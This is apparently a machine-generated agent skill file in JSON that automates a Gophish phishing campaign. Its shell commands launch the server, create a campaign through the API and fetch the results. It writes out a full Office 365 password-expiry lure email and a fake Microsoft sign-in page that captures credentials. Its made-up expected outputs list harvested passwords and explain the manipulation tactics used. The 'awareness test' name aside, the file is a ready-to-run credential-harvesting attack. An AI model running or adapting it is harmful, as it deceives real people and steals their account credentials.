{
  "name": "gophish_phishing_campaign",
  "description": "Deploy and manage phishing campaigns using Gophish framework",
  "pattern": "gophish|phishing.*campaign|email.*phish|credential.*harvest",
  "parameters": [
    "target_email",
    "landing_page"
  ],
  "sequence": [
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "gophish",
        "args": []
      },
      "expected_output": {
        "type": "string",
        "example": "gophish - Open-Source Phishing Framework\n\nVersion : 0.12.1\nBuild Time : 2023-01-15T10:30:00Z\n\nPlease login with the default credentials:\nusername: admin\npassword: gophish\n\nWeb interface: https://127.0.0.1:3333\nAdmin server: https://127.0.0.1:3333\nPhish server: http://0.0.0.0:80\n\n[*] Starting phishing server at http://0.0.0.0:80\n[*] Starting admin server at https://127.0.0.1:3333\n[*] Background Worker Started Successfully"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "bash",
        "args": [
          "-c",
          "curl -k https://127.0.0.1:3333/api/campaigns/ -H 'Authorization: Bearer API_KEY' -d '{\"name\":\"Q4 Security Awareness Test\",\"template\":{\"name\":\"Password Reset\"},\"page\":{\"name\":\"Microsoft Login\"},\"smtp\":{\"name\":\"SendGrid SMTP\"},\"url\":\"http://phish.company.com\",\"groups\":[{\"name\":\"Finance Department\"}]}'"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "HTTP/1.1 201 Created\nContent-Type: application/json\n\n{\n  \"id\": 1,\n  \"name\": \"Q4 Security Awareness Test\",\n  \"created_date\": \"2024-01-15T14:30:00.000Z\",\n  \"launch_date\": \"2024-01-15T14:30:00.000Z\",\n  \"send_by_date\": null,\n  \"completed_date\": null,\n  \"status\": \"In progress\",\n  \"results\": [],\n  \"timeline\": [\n    {\n      \"message\": \"Campaign Created\",\n      \"time\": \"2024-01-15T14:30:00.000Z\"\n    }\n  ],\n  \"smtp\": {\n    \"id\": 1,\n    \"name\": \"SendGrid SMTP\",\n    \"host\": \"smtp.sendgrid.net:587\"\n  },\n  \"url\": \"http://phish.company.com\"\n}\n\nPhishing campaign created successfully\nTarget group: Finance Department (45 users)\nEmail template: Password Reset (urgent tone)\nLanding page: Fake Microsoft Office 365 login"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "bash",
        "args": [
          "-c",
          "curl -k https://127.0.0.1:3333/api/campaigns/1/results -H 'Authorization: Bearer API_KEY'"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "{\n  \"id\": 1,\n  \"name\": \"Q4 Security Awareness Test\",\n  \"status\": \"Completed\",\n  \"results\": [\n    {\n      \"id\": \"a1b2c3d4\",\n      \"email\": \"john.doe@company.com\",\n      \"first_name\": \"John\",\n      \"last_name\": \"Doe\",\n      \"position\": \"Accountant\",\n      \"status\": \"Submitted Data\",\n      \"ip\": \"192.168.1.105\",\n      \"latitude\": 40.7128,\n      \"longitude\": -74.0060,\n      \"send_date\": \"2024-01-15T14:30:15Z\",\n      \"reported\": false,\n      \"modified_date\": \"2024-01-15T14:35:22Z\"\n    },\n    {\n      \"id\": \"e5f6g7h8\",\n      \"email\": \"jane.smith@company.com\",\n      \"status\": \"Email Opened\",\n      \"reported\": false\n    },\n    {\n      \"id\": \"i9j0k1l2\",\n      \"email\": \"mike.johnson@company.com\",\n      \"status\": \"Clicked Link\",\n      \"reported\": false\n    },\n    {\n      \"id\": \"m3n4o5p6\",\n      \"email\": \"sarah.williams@company.com\",\n      \"status\": \"Email Sent\",\n      \"reported\": true\n    }\n  ],\n  \"stats\": {\n    \"total\": 45,\n    \"sent\": 45,\n    \"opened\": 32,\n    \"clicked\": 18,\n    \"submitted_data\": 12,\n    \"email_reported\": 3\n  }\n}\n\nCampaign Results:\n  Total targets: 45\n  Emails opened: 32 (71%)\n  Links clicked: 18 (40%)\n  Credentials submitted: 12 (27%)\n  Reported as phishing: 3 (7%)\n\nHarvested credentials:\n  john.doe@company.com : P@ssw0rd123\n  alice.brown@company.com : Welcome2024\n  david.lee@company.com : Company123!"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "bash",
        "args": [
          "-c",
          "cat > /opt/gophish/templates/email.html << 'EOF'\n<html>\n<body>\n<h2>Action Required: Password Expiration Notice</h2>\n<p>Dear {{.FirstName}} {{.LastName}},</p>\n<p>Your Microsoft Office 365 password will expire in 24 hours. To avoid service interruption, please reset your password immediately.</p>\n<p><a href=\"{{.URL}}\">Reset Password Now</a></p>\n<p>If you do not reset your password, your account will be locked.</p>\n<p>IT Security Team</p>\n<img src=\"{{.Tracker}}\" />\n</body>\n</html>\nEOF"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "Email template created: /opt/gophish/templates/email.html\n\nTemplate features:\n  - Personalization: {{.FirstName}} {{.LastName}}\n  - Phishing URL: {{.URL}}\n  - Tracking pixel: {{.Tracker}}\n  - Urgency: 24 hour deadline\n  - Authority: IT Security Team\n  - Consequence: Account lockout threat\n\nSocial engineering tactics:\n  ✓ Urgency (password expires soon)\n  ✓ Authority (IT Security)\n  ✓ Fear (account will be locked)\n  ✓ Legitimate appearance (Office 365 branding)"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "bash",
        "args": [
          "-c",
          "cat > /opt/gophish/pages/landing.html << 'EOF'\n<!DOCTYPE html>\n<html>\n<head>\n<title>Microsoft Office 365 - Sign In</title>\n<style>body{font-family:Segoe UI,Arial;background:#f3f2f1}.login-box{width:400px;margin:100px auto;background:white;padding:40px;box-shadow:0 2px 6px rgba(0,0,0,.2)}</style>\n</head>\n<body>\n<div class=\"login-box\">\n<img src=\"https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg\" width=\"108\" height=\"24\" />\n<h2>Sign in</h2>\n<form method=\"POST\" action=\"\">\n<input type=\"email\" name=\"email\" placeholder=\"Email\" required style=\"width:100%;padding:10px;margin:10px 0\" />\n<input type=\"password\" name=\"password\" placeholder=\"Password\" required style=\"width:100%;padding:10px;margin:10px 0\" />\n<button type=\"submit\" style=\"width:100%;padding:12px;background:#0078d4;color:white;border:none\">Sign in</button>\n</form>\n</div>\n</body>\n</html>\nEOF"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "Landing page created: /opt/gophish/pages/landing.html\n\nPage features:\n  - Microsoft branding and logo\n  - Authentic Office 365 appearance\n  - Captures email and password\n  - POST data to Gophish server\n  - Redirects after submission\n\nCredential harvesting:\n  When user submits form:\n  1. Gophish captures credentials\n  2. Logs submission in database\n  3. Marks result as 'Submitted Data'\n  4. Optionally redirects to real Office 365\n\nStored credentials accessible via API:\n  GET /api/campaigns/1/results"
      }
    }
  ],
  "stats": {
    "uses": 0,
    "successes": 0,
    "failures": 0,
    "success_rate": 0.0
  },
  "created_by": "neural_mesh_v5.2_generator"
}
